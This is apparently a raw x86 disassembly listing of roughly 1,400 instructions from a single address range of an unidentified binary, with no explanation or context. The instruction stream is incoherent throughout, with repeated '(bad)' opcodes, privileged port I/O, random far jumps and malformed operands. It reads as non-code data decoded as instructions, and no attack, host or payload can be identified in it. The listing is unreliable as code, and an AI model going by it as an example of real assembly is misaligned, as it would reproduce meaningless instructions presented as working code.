  41b76c:	imul   ecx,edx,0x87935ba9
  41b772:	add    ch,BYTE PTR [ebp+0x35]
  41b775:	nop
  41b776:	mov    eax,0x7d11f406
  41b77b:	cld    
  41b77c:	xor    eax,0x69531d4a
  41b781:	pop    DWORD PTR [edi+0x77ce61e7]
  41b787:	xchg   edi,eax
  41b788:	cmp    ecx,DWORD PTR [esi+0x17]
  41b78b:	mov    dl,0x19
  41b78d:	or     eax,0x2a602194
  41b792:	daa    
  41b793:	popf   
  41b794:	not    ecx
  41b796:	test   BYTE PTR [edi+0x40e0cf76],bh
  41b79c:	push   ebp
  41b79d:	add    ebx,DWORD PTR [ebx-0x61]
  41b7a0:	iret   
  41b7a1:	xchg   esi,eax
  41b7a2:	(bad)  
  41b7a3:	or     BYTE PTR [edx+0x38e27afa],bl
  41b7a9:	arpl   si,di
  41b7ab:	fdiv   QWORD PTR [edx]
  41b7ad:	int    0x42
  41b7af:	xchg   esi,eax
  41b7b0:	mov    dh,0xf6
  41b7b2:	pop    edi
  41b7b3:	addr16 or eax,0x96a7f528
  41b7b9:	pop    eax
  41b7ba:	mov    eax,0x97a4b83f
  41b7bf:	mov    ah,0x4f
  41b7c1:	sub    al,ch
  41b7c3:	xor    edx,DWORD PTR [eax-0x3bba5cd3]
  41b7c9:	dec    edx
  41b7ca:	cmps   DWORD PTR cs:[esi],DWORD PTR es:[edi]
  41b7cc:	mov    DWORD PTR [edx+eax*2-0x47241b6a],edx
  41b7d3:	dec    esi
  41b7d4:	mov    BYTE PTR [edi-0x135b4e3f],dh
  41b7da:	push   0x7ad8284f
  41b7df:	outs   dx,BYTE PTR ds:[esi]
  41b7e0:	fidivr DWORD PTR [ecx+ecx*8+0x30]
  41b7e4:	arpl   WORD PTR [ebp+0x66],cx
  41b7e7:	cmp    al,0xeb
  41b7e9:	pop    ss
  41b7ea:	pop    esp
  41b7eb:	lock lea edi,[ecx+esi*4-0x47e669d2]
  41b7f3:	jo     0x41b77c
  41b7f5:	loop   0x41b838
  41b7f7:	dec    edi
  41b7f8:	mov    edx,0x449b258d
  41b7fd:	loopne 0x41b7e3
  41b7ff:	push   ecx
  41b800:	xchg   ecx,eax
  41b801:	pop    eax
  41b802:	push   es
  41b803:	loop   0x41b853
  41b805:	std    
  41b806:	scas   al,BYTE PTR es:[edi]
  41b807:	jo     0x41b816
  41b809:	pop    edx
  41b80a:	ins    BYTE PTR es:[edi],dx
  41b80b:	push   cs
  41b80c:	bswap  ebp
  41b80e:	sbb    eax,0x1ac7fa9b
  41b813:	cwde   
  41b814:	and    DWORD PTR [edx],ecx
  41b816:	retf   
  41b817:	inc    edi
  41b818:	or     eax,DWORD PTR [ebx]
  41b81a:	add    BYTE PTR [esi+0x7a25ccdd],0xe8
  41b821:	mov    esi,0x84de2203
  41b826:	jmp    0x41b860
  41b828:	dec    edi
  41b829:	push   eax
  41b82a:	sub    bh,cl
  41b82c:	or     al,0x66
  41b82e:	add    al,0xb1
  41b830:	pop    edi
  41b831:	stos   BYTE PTR es:[edi],al
  41b832:	cmp    ah,0x30
  41b835:	stos   BYTE PTR es:[edi],al
  41b836:	in     eax,dx
  41b837:	ds adc eax,eax
  41b83a:	outs   dx,DWORD PTR ds:[esi]
  41b83b:	es sbb al,0x98
  41b83e:	sar    DWORD PTR [ebx],0x9c
  41b841:	push   esp
  41b842:	inc    edi
  41b843:	call   0x5b1ed6ea
  41b848:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41b849:	pop    ebp
  41b84a:	inc    ebx
  41b84b:	or     al,BYTE PTR [edx+ebx*1+0x2e]
  41b84f:	xor    DWORD PTR [edx-0x51c4962d],edi
  41b855:	jecxz  0x41b83a
  41b857:	lahf   
  41b858:	mov    ebp,0x2c53eb9f
  41b85d:	jb     0x41b82c
  41b85f:	jns    0x41b813
  41b861:	call   0x2df2:0x6aafb4b5
  41b868:	mov    bh,0x32
  41b86a:	ror    BYTE PTR [ebx-0x5d],1
  41b86d:	dec    ebx
  41b86e:	outs   dx,DWORD PTR ds:[esi]
  41b86f:	scas   eax,DWORD PTR es:[edi]
  41b870:	push   ecx
  41b871:	jecxz  0x41b89a
  41b873:	rol    DWORD PTR [ebx],1
  41b875:	dec    ebp
  41b876:	icebp  
  41b877:	push   eax
  41b878:	fld    TBYTE PTR [edx+0x7bc82631]
  41b87e:	cld    
  41b87f:	lock sbb BYTE PTR [esi],dh
  41b882:	out    0x7,eax
  41b884:	arpl   dx,cx
  41b886:	daa    
  41b887:	sbb    eax,0x24e5ad02
  41b88c:	cmp    al,cl
  41b88e:	jae    0x41b8d4
  41b890:	adc    eax,0xbb5b6cb2
  41b895:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41b896:	hlt    
  41b897:	xlat   BYTE PTR ds:[ebx]
  41b898:	adc    DWORD PTR [ecx-0x31],esp
  41b89b:	pusha  
  41b89c:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41b89d:	cmp    eax,0x7492cd2e
  41b8a2:	(bad)  
  41b8a3:	sub    BYTE PTR [ecx],cl
  41b8a5:	mov    edi,0x1db0a887
  41b8aa:	in     eax,0x2b
  41b8ac:	and    DWORD PTR [ecx+0x58d8044c],ecx
  41b8b2:	(bad)  
  41b8b3:	daa    
  41b8b4:	adc    al,0xa7
  41b8b6:	jg     0x41b8b3
  41b8b8:	leave  
  41b8b9:	mov    al,0x25
  41b8bb:	mov    ebp,0x2d0c0115
  41b8c0:	add    DWORD PTR gs:[ecx],eax
  41b8c3:	xor    BYTE PTR [ebp-0x25],bh
  41b8c6:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41b8c7:	fs mov edi,0x6bb83d88
  41b8cd:	jne    0x41b8aa
  41b8cf:	jae    0x41b891
  41b8d1:	xor    esi,esi
  41b8d3:	test   eax,0x76b31243
  41b8d8:	(bad)  
  41b8d9:	(bad)  
  41b8da:	xchg   ebx,eax
  41b8db:	mov    esi,0xe49984c8
  41b8e0:	pop    si
  41b8e2:	repz sub eax,0xa8ab41ea
  41b8e8:	lahf   
  41b8e9:	sub    esp,DWORD PTR [esi+0x54]
  41b8ec:	mov    dl,0xcf
  41b8ee:	ror    edi,1
  41b8f0:	(bad)  
  41b8f1:	retf   
  41b8f2:	inc    BYTE PTR [ecx-0xa0daa05]
  41b8f8:	push   edx
  41b8f9:	sbb    eax,0xc33f8aab
  41b8fe:	inc    esp
  41b8ff:	add    bh,bl
  41b901:	ret    0xedd1
  41b904:	out    0x13,al
  41b906:	imul   eax,DWORD PTR [esi-0x4b],0xffffff8e
  41b90a:	fmul   QWORD PTR [ecx-0x626c72da]
  41b910:	retf   
  41b911:	cli    
  41b912:	push   0xbab86cd
  41b917:	xchg   esi,eax
  41b918:	(bad)  
  41b91a:	int3   
  41b91b:	mov    ebp,0x7dba0f63
  41b920:	rol    ah,0x93
  41b923:	data16 je 0x41b996
  41b926:	xchg   DWORD PTR [ecx-0x6c],ebp
  41b929:	add    DWORD PTR [esi-0x51],esi
  41b92c:	sahf   
  41b92d:	adc    ebp,DWORD PTR [eax]
  41b92f:	imul   ecx,DWORD PTR [edi+ecx*8-0x28],0x8d4df6a6
  41b937:	mov    edi,0xb7d39f6d
  41b93c:	neg    BYTE PTR ds:0xb2b5d9a3
  41b942:	not    DWORD PTR [ebp+0x1d847d17]
  41b948:	cmp    esp,edx
  41b94a:	push   ds
  41b94b:	cs aam 0x7
  41b94e:	pop    esp
  41b94f:	test   DWORD PTR [eax],eax
  41b951:	(bad)  
  41b952:	xchg   edi,eax
  41b953:	push   ds
  41b954:	or     BYTE PTR [edx+0x531779e6],0xb1
  41b95b:	adc    DWORD PTR [ebx],edi
  41b95d:	daa    
  41b95e:	loop   0x41b9bf
  41b960:	sbb    ch,BYTE PTR [eax]
  41b962:	(bad)  
  41b963:	ret    0x1053
  41b966:	mov    bl,0xb6
  41b968:	shr    edi,cl
  41b96a:	popw   ss
  41b96c:	pushf  
  41b96d:	xlat   BYTE PTR ds:[ebx]
  41b96e:	add    BYTE PTR [esi-0xd9ed366],al
  41b974:	dec    ebx
  41b975:	in     al,dx
  41b976:	popf   
  41b977:	stos   DWORD PTR es:[edi],eax
  41b978:	xchg   edi,eax
  41b979:	pop    ds
  41b97a:	aam    0x82
  41b97c:	pop    eax
  41b97d:	fcomp  QWORD PTR [edi-0x67f9d0ba]
  41b983:	mov    ah,0x57
  41b985:	xor    edi,ecx
  41b987:	mov    ebp,0xc0f78a92
  41b98c:	in     eax,dx
  41b98d:	sbb    eax,0x2750bb4d
  41b992:	xor    al,0x99
  41b994:	scas   eax,DWORD PTR es:[edi]
  41b995:	or     BYTE PTR ds:0x2aee1418,0x7
  41b99c:	out    dx,al
  41b99d:	and    eax,0xc52d7a6c
  41b9a2:	mov    ah,0x16
  41b9a4:	sub    al,0x3d
  41b9a6:	data16 mov ds:0xfa71d153,al
  41b9ac:	rcr    DWORD PTR [edx],cl
  41b9ae:	shr    DWORD PTR [edx-0x238300b9],1
  41b9b4:	push   ecx
  41b9b5:	push   eax
  41b9b6:	fwait
  41b9b7:	inc    edi
  41b9b8:	ds jbe 0x41b9f9
  41b9bb:	(bad)  
  41b9bc:	pop    ss
  41b9bd:	jp     0x41b9d3
  41b9bf:	cmc    
  41b9c0:	test   BYTE PTR [ebx],bl
  41b9c2:	mov    ds:0x1c4eb4ac,al
  41b9c7:	mov    bl,0x23
  41b9c9:	cdq    
  41b9ca:	repnz or ebp,DWORD PTR [edi-0x599dd6fb]
  41b9d1:	out    dx,al
  41b9d2:	test   al,0x97
  41b9d4:	out    0x2f,al
  41b9d6:	xor    bl,al
  41b9d8:	xlat   BYTE PTR ds:[ebx]
  41b9d9:	scas   al,BYTE PTR es:[edi]
  41b9da:	pop    esp
  41b9db:	lods   al,BYTE PTR ds:[esi]
  41b9dc:	pop    esp
  41b9dd:	xchg   esi,eax
  41b9de:	neg    DWORD PTR [edx]
  41b9e0:	cwde   
  41b9e1:	cmp    al,0x9b
  41b9e3:	cli    
  41b9e4:	cmp    DWORD PTR [ecx],edi
  41b9e6:	repz cmp al,0x21
  41b9e9:	inc    ebp
  41b9ea:	inc    esi
  41b9eb:	js     0x41b9cc
  41b9ed:	adc    eax,0x45055a37
  41b9f2:	dec    esi
  41b9f3:	adc    BYTE PTR [edi],ch
  41b9f5:	mov    edi,0x1ccd489
  41b9fa:	cs std 
  41b9fc:	stos   BYTE PTR es:[edi],al
  41b9fd:	jmp    0xdefd:0x15e5da77
  41ba04:	xor    BYTE PTR [ecx-0x38f0fef7],ch
  41ba0a:	inc    ecx
  41ba0b:	jecxz  0x41b9ba
  41ba0d:	pop    edi
  41ba0e:	loop   0x41b9ae
  41ba10:	push   ds
  41ba11:	cmc    
  41ba12:	sahf   
  41ba13:	retf   0x820c
  41ba16:	or     esi,DWORD PTR [esp+eax*1+0x4d83dbc3]
  41ba1d:	mov    esp,0x6f271476
  41ba22:	in     eax,0xac
  41ba24:	cmp    BYTE PTR [ecx],bl
  41ba26:	xor    al,0xf5
  41ba28:	aad    0x3
  41ba2a:	fcmovu st,st(2)
  41ba2c:	mov    ds:0x4818a499,eax
  41ba31:	outs   dx,BYTE PTR ds:[esi]
  41ba32:	add    al,al
  41ba34:	rcr    DWORD PTR [edi+ebx*8],1
  41ba37:	(bad)  
  41ba38:	push   esi
  41ba39:	jbe    0x41b9fa
  41ba3b:	sub    ebx,0xffffffc6
  41ba3e:	inc    esp
  41ba3f:	mov    ds:0x9e7dca06,al
  41ba44:	sub    BYTE PTR [eax+0x26151509],bl
  41ba4a:	ret    0xcd5f
  41ba4d:	pop    edx
  41ba4e:	push   edi
  41ba4f:	loopne 0x41ba87
  41ba51:	cs aam 0xf3
  41ba54:	(bad)  
  41ba56:	mov    ecx,0xcc9cd4e4
  41ba5b:	dec    ebx
  41ba5c:	mov    bl,0xfb
  41ba5e:	adc    esi,DWORD PTR [edi-0xe8d7e0]
  41ba64:	dec    eax
  41ba65:	add    DWORD PTR [ebp+0x55],0x5c
  41ba69:	mov    cs,eax
  41ba6b:	stos   BYTE PTR es:[edi],al
  41ba6c:	daa    
  41ba6d:	jne    0x41ba59
  41ba6f:	(bad)  
  41ba70:	mov    edi,0x525dd836
  41ba75:	xor    eax,0x94f8c2ed
  41ba7a:	cmp    al,0xaa
  41ba7c:	xor    DWORD PTR [ecx+eiz*2-0x2d7839cb],0xe75374ed
  41ba87:	je     0x41bae9
  41ba89:	fldcw  WORD PTR [eax]
  41ba8b:	xor    eax,0x64437a98
  41ba90:	iret   
  41ba91:	sbb    BYTE PTR [ebx+0x33],0xd7
  41ba95:	ja     0x41ba84
  41ba97:	jg     0x41ba46
  41ba99:	add    BYTE PTR [ecx-0x6a],bl
  41ba9c:	cmp    eax,0x96a0ba0
  41baa1:	sar    ecx,cl
  41baa3:	int3   
  41baa4:	mov    BYTE PTR [eax-0x257949a],dl
  41baaa:	in     al,dx
  41baab:	int    0xf6
  41baad:	aaa    
  41baae:	mul    ebp
  41bab0:	jmp    0x9786:0xe07063fb
  41bab7:	call   0x925a:0x525c0c24
  41babe:	add    BYTE PTR [edi],dh
  41bac0:	stc    
  41bac1:	xor    al,0x54
  41bac3:	cmp    bh,ah
  41bac5:	test   DWORD PTR [edx-0x52],0x7d2df0a1
  41bacc:	push   0xf37dbe19
  41bad1:	xor    al,0x85
  41bad3:	inc    BYTE PTR [ebx-0x1a1501ed]
  41bad9:	xor    dl,BYTE PTR [esi+0x32859e94]
  41badf:	adc    BYTE PTR [esi-0x54135f68],al
  41bae5:	fst    DWORD PTR [edi+edx*8-0x3f]
  41bae9:	inc    eax
  41baea:	mov    ds:0xdf73140a,eax
  41baef:	cwde   
  41baf0:	xchg   BYTE PTR [ebx],ch
  41baf2:	inc    ecx
  41baf3:	xor    cl,ch
  41baf5:	xchg   esi,eax
  41baf6:	dec    ecx
  41baf7:	lock pop ebp
  41baf9:	push   ebp
  41bafa:	nop
  41bafb:	dec    edx
  41bafc:	adc    ebp,DWORD PTR [eax+0x53]
  41baff:	adc    al,0x6a
  41bb01:	sub    al,0x55
  41bb03:	mov    edi,0xfe27a86a
  41bb08:	fisub  DWORD PTR [edx*4+0x4913b8b3]
  41bb0f:	mov    ebp,0xfd343db
  41bb14:	jl     0x41baf3
  41bb16:	pop    esi
  41bb17:	scas   eax,DWORD PTR es:[edi]
  41bb18:	xchg   edx,eax
  41bb19:	xor    ebp,DWORD PTR [esi-0x3f]
  41bb1c:	push   0xffffffff
  41bb1e:	push   esp
  41bb1f:	mov    DWORD PTR [edx],esp
  41bb21:	fwait
  41bb22:	mov    edi,0x87f3779e
  41bb27:	rcr    esp,1
  41bb29:	call   0xc44025fc
  41bb2e:	xchg   esp,eax
  41bb2f:	(bad)  
  41bb32:	pusha  
  41bb33:	cmp    al,0x18
  41bb35:	push   ebx
  41bb36:	stos   DWORD PTR es:[edi],eax
  41bb37:	mov    ebx,0xc8d4e000
  41bb3c:	xchg   esi,eax
  41bb3d:	loope  0x41bb37
  41bb3f:	push   edi
  41bb40:	adc    eax,0xb4b2f84f
  41bb45:	and    edx,DWORD PTR [edi-0x3c50c370]
  41bb4b:	mov    bh,al
  41bb4d:	aad    0x32
  41bb4f:	or     BYTE PTR [edi+0x3a7bb84],dl
  41bb55:	inc    ebx
  41bb56:	sbb    al,0x11
  41bb58:	and    bl,dh
  41bb5a:	fsubrp st(1),st
  41bb5c:	cmp    DWORD PTR ds:0x3ef43f38,ecx
  41bb62:	sub    eax,0x70538c57
  41bb67:	std    
  41bb68:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41bb69:	mov    ah,0x97
  41bb6b:	test   bl,0xf0
  41bb6e:	sbb    DWORD PTR [ebp+0x15],ebx
  41bb71:	loope  0x41bafe
  41bb73:	lea    eax,[esp+eiz*2-0x7e]
  41bb77:	pushf  
  41bb78:	nop
  41bb79:	jnp    0x41bb44
  41bb7b:	xchg   esp,eax
  41bb7c:	mov    eax,0x5019286d
  41bb81:	sub    DWORD PTR [esp+eiz*2-0x74684dc8],0xffffffdd
  41bb89:	sbb    DWORD PTR [ecx],0x7fab50d5
  41bb8f:	cwde   
  41bb90:	and    DWORD PTR [edx+0x1a],0x67
  41bb94:	leave  
  41bb95:	sbb    cl,BYTE PTR [ebp+0x28883c4e]
  41bb9b:	adc    DWORD PTR [edx-0x47],eax
  41bb9e:	or     DWORD PTR [edx+eax*4],0xec6c1010
  41bba5:	and    al,0x6
  41bba7:	imul   edx,DWORD PTR [edi],0x55
  41bbaa:	in     al,dx
  41bbab:	push   eax
  41bbac:	ret    0x1979
  41bbaf:	cmp    al,0x7
  41bbb1:	cmp    BYTE PTR [esp+ebp*8-0x4e5c16bf],0x11
  41bbb9:	jne    0x41bb98
  41bbbb:	loope  0x41bbec
  41bbbd:	cli    
  41bbbe:	test   DWORD PTR [edx+0x527055b4],edx
  41bbc4:	dec    edi
  41bbc5:	hlt    
  41bbc6:	popa   
  41bbc7:	dec    esp
  41bbc8:	aad    0x9c
  41bbca:	cmp    edx,DWORD PTR [edx]
  41bbcc:	mov    ch,0x3
  41bbce:	sub    BYTE PTR [edi+0x75],ah
  41bbd1:	push   ebp
  41bbd2:	sbb    ecx,DWORD PTR [eax-0x4c5f2f3d]
  41bbd8:	arpl   WORD PTR [eax+0x19],di
  41bbdb:	pop    esp
  41bbdc:	adc    bl,BYTE PTR [ebx-0xc45399f]
  41bbe2:	scas   eax,DWORD PTR es:[edi]
  41bbe3:	jecxz  0x41bb82
  41bbe5:	int3   
  41bbe6:	mov    ebx,0xd0a60aa2
  41bbeb:	pushf  
  41bbec:	jge    0x41bbf3
  41bbee:	fwait
  41bbef:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41bbf0:	lods   eax,DWORD PTR ds:[esi]
  41bbf1:	mov    ds,WORD PTR [eax-0x38]
  41bbf4:	inc    ecx
  41bbf5:	es push esp
  41bbf7:	sbb    DWORD PTR [edi+0x5a],ebp
  41bbfa:	and    eax,0xb63ee117
  41bbff:	mov    ebx,0x54cce86e
  41bc04:	fcmovb st,st(2)
  41bc06:	add    ch,BYTE PTR [ecx]
  41bc08:	xor    DWORD PTR [ecx],edx
  41bc0a:	sub    DWORD PTR [esi],esi
  41bc0c:	test   eax,0x75a852d9
  41bc11:	test   BYTE PTR [esi],dh
  41bc13:	adc    al,0xc9
  41bc15:	xlat   BYTE PTR ds:[ebx]
  41bc16:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41bc17:	xchg   esp,eax
  41bc18:	call   0x31133a4a
  41bc1d:	mov    DWORD PTR [eax+0x21],esp
  41bc20:	mov    ds,WORD PTR [ecx]
  41bc22:	shr    DWORD PTR [eax-0x42],1
  41bc25:	inc    eax
  41bc26:	in     al,dx
  41bc27:	test   al,0xe8
  41bc29:	jmp    0x41bc1d
  41bc2b:	js     0x41bc19
  41bc2d:	cmp    DWORD PTR [eax+0x59],ebx
  41bc30:	repz mov eax,0x7003629
  41bc36:	out    0x59,eax
  41bc38:	clc    
  41bc39:	cmp    ah,BYTE PTR [ebx]
  41bc3b:	shr    BYTE PTR [eax+0x2c],1
  41bc3e:	adc    DWORD PTR [edx],ecx
  41bc40:	mov    ?,eax
  41bc42:	jp     0x41bbcc
  41bc44:	mov    al,ds:0xdbcc0a25
  41bc49:	pop    es
  41bc4a:	xor    BYTE PTR [esi],0x74
  41bc4d:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41bc4e:	xchg   ecx,eax
  41bc4f:	and    eax,0x160ddf26
  41bc54:	cmp    DWORD PTR [esi-0x7232f143],0x14
  41bc5b:	out    0xb2,eax
  41bc5d:	lods   eax,DWORD PTR ds:[esi]
  41bc5e:	or     ecx,edi
  41bc60:	daa    
  41bc61:	sub    ecx,0x2d7303e0
  41bc67:	adc    BYTE PTR [edi],ah
  41bc69:	ss dec ebx
  41bc6b:	xchg   ebp,eax
  41bc6c:	inc    eax
  41bc6d:	daa    
  41bc6e:	xor    al,0x1c
  41bc70:	or     DWORD PTR [edx-0x11],edx
  41bc73:	xchg   ebp,eax
  41bc74:	sub    al,0x6c
  41bc76:	and    DWORD PTR [ebp+edx*4+0x7f],ecx
  41bc7a:	or     eax,0x8ad58cc0
  41bc7f:	addr16 sahf 
  41bc81:	or     al,0x39
  41bc83:	inc    ecx
  41bc84:	(bad)  
  41bc85:	xor    al,0xa1
  41bc87:	jae    0x41bc68
  41bc89:	xor    DWORD PTR [eax-0x5042a218],eax
  41bc8f:	loopne 0x41bc72
  41bc91:	ret    
  41bc92:	adc    DWORD PTR [esi],esi
  41bc94:	out    dx,al
  41bc95:	repz addr16 add eax,edx
  41bc99:	jnp    0x41bcbb
  41bc9b:	xchg   edx,eax
  41bc9c:	pop    edx
  41bc9d:	sub    ch,BYTE PTR [esp+edx*2+0x73]
  41bca1:	and    ch,BYTE PTR [ebx]
  41bca3:	xchg   edx,eax
  41bca4:	cmp    BYTE PTR [eax+0x5f4906ee],bh
  41bcaa:	push   ebp
  41bcab:	pop    ebx
  41bcac:	stos   DWORD PTR es:[edi],eax
  41bcad:	mov    bh,0x27
  41bcaf:	pop    eax
  41bcb0:	imul   edi,DWORD PTR [edx],0x30804bb8
  41bcb6:	push   0x42
  41bcb8:	mov    al,BYTE PTR [ebx]
  41bcba:	xor    al,0x46
  41bcbc:	dec    ebp
  41bcbd:	sub    BYTE PTR [ebx-0x12],dl
  41bcc0:	and    ecx,DWORD PTR [ecx]
  41bcc2:	cwde   
  41bcc3:	leave  
  41bcc4:	jmp    0x41a1:0x3b3e94eb
  41bccb:	cwde   
  41bccc:	js     0x41bc8d
  41bcce:	xchg   ebp,eax
  41bccf:	mov    BYTE PTR [ebx+0x38],dl
  41bcd2:	imul   ecx,esp,0xffffff94
  41bcd5:	pop    ss
  41bcd6:	jnp    0x41bca6
  41bcd8:	add    BYTE PTR [esi-0x253726e8],dl
  41bcde:	dec    eax
  41bcdf:	lods   eax,DWORD PTR ds:[esi]
  41bce0:	pop    ebp
  41bce1:	adc    BYTE PTR [ebp-0x3d568307],al
  41bce7:	scas   eax,DWORD PTR es:[edi]
  41bce8:	clc    
  41bce9:	xchg   ebp,eax
  41bcea:	pushf  
  41bceb:	shl    DWORD PTR [eax],cl
  41bced:	jle    0x41bd4b
  41bcef:	push   eax
  41bcf0:	jmp    DWORD PTR [edx]
  41bcf2:	inc    esp
  41bcf3:	jns    0x41bd2f
  41bcf5:	and    DWORD PTR [eax-0x394da848],ecx
  41bcfb:	pop    esp
  41bcfc:	sub    BYTE PTR [ebx+ebx*2-0x9],cl
  41bd00:	sbb    al,BYTE PTR [eax+0x43a45ec9]
  41bd06:	lock outs dx,DWORD PTR ds:[esi]
  41bd08:	aad    0x87
  41bd0a:	scas   al,BYTE PTR es:[edi]
  41bd0b:	out    dx,eax
  41bd0c:	dec    ebx
  41bd0d:	repz and BYTE PTR [esi+edi*2+0x76],bl
  41bd12:	pusha  
  41bd13:	add    BYTE PTR [esi+0x24a07642],dl
  41bd19:	cmp    al,0xe0
  41bd1b:	pusha  
  41bd1c:	cmp    eax,0x1cf1a805
  41bd21:	fldcw  WORD PTR [edi]
  41bd23:	jp     0x41bd10
  41bd25:	repz aaa 
  41bd27:	jecxz  0x41bd0d
  41bd29:	sbb    esp,ebp
  41bd2b:	pop    ss
  41bd2c:	xor    DWORD PTR [edx],ebp
  41bd2e:	shl    BYTE PTR [ecx-0x27],0x62
  41bd32:	das    
  41bd33:	pushf  
  41bd34:	sbb    edx,edx
  41bd36:	hlt    
  41bd37:	inc    ebx
  41bd38:	sar    BYTE PTR [ebp-0x45],0x45
  41bd3c:	loop   0x41bcfa
  41bd3e:	daa    
  41bd3f:	mov    ah,0x8c
  41bd41:	(bad)  
  41bd43:	mov    ?,WORD PTR [esi+0x4ade765a]
  41bd49:	in     eax,dx
  41bd4a:	add    eax,0x93aef9f6
  41bd4f:	sbb    edi,esi
  41bd51:	sbb    esi,esp
  41bd53:	test   DWORD PTR [edx+0x45],0x60f5977f
  41bd5a:	pop    ebp
  41bd5b:	xor    edx,DWORD PTR [esi]
  41bd5d:	or     BYTE PTR [ebp-0x69438385],dl
  41bd63:	rol    ebx,1
  41bd65:	in     al,dx
  41bd66:	es ss cli 
  41bd69:	xor    al,0x8f
  41bd6b:	and    BYTE PTR ds:0xc6e73200,al
  41bd71:	out    dx,eax
  41bd72:	mov    eax,ds:0xc620a3da
  41bd77:	sar    BYTE PTR [edi-0x45],1
  41bd7a:	sbb    edx,DWORD PTR [bx+di]
  41bd7d:	pop    esi
  41bd7e:	mov    dh,0xe1
  41bd80:	adc    esp,ebx
  41bd82:	adc    cl,BYTE PTR [edi]
  41bd84:	jns    0x41bd3a
  41bd86:	inc    ebp
  41bd87:	jbe    0x41bd79
  41bd89:	xchg   esi,eax
  41bd8a:	(bad)  
  41bd8b:	test   eax,0x78a0a7f9
  41bd90:	pop    ecx
  41bd91:	leave  
  41bd92:	push   ebp
  41bd93:	mov    DWORD PTR [eax+0x79d20e19],ebx
  41bd99:	das    
  41bd9a:	into   
  41bd9b:	add    DWORD PTR [ebp-0x55],ecx
  41bd9e:	and    al,0x47
  41bda0:	xchg   edx,eax
  41bda1:	pop    es
  41bda2:	xchg   ebp,eax
  41bda3:	stos   DWORD PTR es:[edi],eax
  41bda4:	stos   DWORD PTR es:[edi],eax
  41bda5:	xchg   ecx,eax
  41bda6:	add    dl,dl
  41bda8:	dec    esi
  41bda9:	test   DWORD PTR [ecx-0x20103e5c],edi
  41bdaf:	pop    ecx
  41bdb0:	mov    cl,0xc9
  41bdb2:	sub    al,0x3e
  41bdb4:	inc    ecx
  41bdb5:	mov    al,0xd9
  41bdb7:	jnp    0x41bdea
  41bdb9:	(bad)  
  41bdba:	mov    al,0xb8
  41bdbc:	push   edi
  41bdbd:	sbb    al,0x63
  41bdbf:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41bdc0:	lods   eax,DWORD PTR ds:[esi]
  41bdc1:	enter  0x68fd,0xe8
  41bdc5:	mov    al,BYTE PTR [ebp-0x5]
  41bdc8:	xchg   DWORD PTR [ecx],esp
  41bdca:	(bad)  
  41bdcb:	jne    0x41bd73
  41bdcd:	cwde   
  41bdce:	sub    BYTE PTR [ecx-0x540b4eb7],ch
  41bdd4:	mov    dh,BYTE PTR [eax-0x42f3e4c0]
  41bdda:	mov    eax,0xcd789b8d
  41bddf:	xor    BYTE PTR [edx],al
  41bde1:	adc    eax,0x7e02541f
  41bde6:	(bad)  [ebp+0x12]
  41bde9:	outs   dx,DWORD PTR ds:[esi]
  41bdea:	in     eax,dx
  41bdeb:	sbb    dh,BYTE PTR es:[ebx-0x1c]
  41bdef:	cmp    al,cl
  41bdf1:	inc    ebp
  41bdf2:	es ins BYTE PTR es:[edi],dx
  41bdf4:	jb     0x41be0d
  41bdf6:	or     al,0xc1
  41bdf8:	out    0x13,al
  41bdfa:	xchg   ebx,eax
  41bdfb:	and    DWORD PTR [eax-0x5e5732f4],esp
  41be01:	outs   dx,DWORD PTR ds:[esi]
  41be02:	sub    BYTE PTR [edx],bl
  41be04:	outs   dx,BYTE PTR ds:[esi]
  41be05:	leave  
  41be06:	pop    es
  41be07:	bound  esp,QWORD PTR [eax+0xe]
  41be0a:	xor    al,0xac
  41be0c:	adc    DWORD PTR ds:0xb276c40e,esp
  41be12:	sar    DWORD PTR [ebx+0x4be2e63a],0x48
  41be19:	pop    ds
  41be1a:	dec    edx
  41be1b:	mov    ebp,DWORD PTR [eax+0x13da0700]
  41be21:	push   ecx
  41be22:	cmc    
  41be23:	xchg   BYTE PTR [esi+edi*4-0x1f],dl
  41be27:	mov    BYTE PTR [esi+0xda6e795],al
  41be2d:	sti    
  41be2e:	test   al,0x7d
  41be30:	push   ss
  41be31:	scas   eax,DWORD PTR es:[edi]
  41be32:	adc    ebx,ecx
  41be34:	jae    0x41be32
  41be36:	dec    edx
  41be37:	daa    
  41be38:	imul   esi,DWORD PTR [ecx],0x97411c20
  41be3e:	and    edx,ecx
  41be40:	into   
  41be41:	call   DWORD PTR [eax+0x585e2927]
  41be47:	pushf  
  41be48:	push   ebp
  41be49:	pop    edx
  41be4a:	jp     0x41be8e
  41be4c:	lds    ebx,FWORD PTR [edx-0x6f264c02]
  41be52:	fidiv  WORD PTR [eax-0x3647aac9]
  41be58:	int3   
  41be59:	stos   DWORD PTR es:[edi],eax
  41be5a:	mov    dl,0x78
  41be5c:	mul    BYTE PTR ds:0x9b97278
  41be62:	inc    esi
  41be63:	push   edx
  41be64:	outs   dx,BYTE PTR ds:[esi]
  41be65:	mov    edi,0x7cba3cfb
  41be6a:	dec    ah
  41be6c:	jecxz  0x41be99
  41be6e:	dec    ebx
  41be6f:	mov    al,0xc0
  41be71:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41be72:	aas    
  41be73:	fild   WORD PTR [ebx-0x70]
  41be76:	bound  esp,QWORD PTR [edi-0x7d6e9550]
  41be7c:	scas   al,BYTE PTR es:[edi]
  41be7d:	push   esp
  41be7e:	stc    
  41be7f:	out    dx,eax
  41be80:	int    0x71
  41be82:	rcr    DWORD PTR ds:0x38771de0,1
  41be88:	adc    al,0xa0
  41be8a:	ret    
  41be8b:	ret    
  41be8c:	jbe    0x41bed2
  41be8e:	jmp    0x674a:0x83e7a46c
  41be95:	dec    esp
  41be96:	(bad)
  41be9a:	aaa    
  41be9b:	cmp    dh,BYTE PTR [ebx+0xb43ef77]
  41bea1:	icebp  
  41bea2:	ins    BYTE PTR es:[edi],dx
  41bea3:	mov    dh,0x68
  41bea5:	daa    
  41bea6:	cdq    
  41bea7:	xor    bh,BYTE PTR [eax]
  41bea9:	inc    ecx
